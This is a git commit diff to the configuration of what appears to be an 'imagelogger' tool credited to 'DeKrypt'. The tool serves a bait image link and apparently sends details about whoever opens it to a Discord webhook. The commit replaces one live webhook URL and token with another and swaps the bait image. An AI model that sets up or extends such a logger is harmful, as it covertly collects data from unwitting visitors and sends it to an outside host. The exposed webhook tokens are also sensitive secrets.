ab56fdf7c8031c99d69a741a82b9892640a269d2
mosyassd78-dot <mosyassd78@gmail.com>
2025-11-15 19:05:42 +0300

    Update webhook and image URLs in configuration

--- api/joe.py
+++ api/joe.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1439283985225351382/Wa9D4r_nzShpvjVbu5Y9WwORAz0AsrZ330tUWLL9wnUlNvf7GqXuk3xJdnun2lDLXkO7",
+    "image": "https://image.tmdb.org/t/p/w780/xLgRBj0iO3DFTzcBmZqgR01NyTa.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
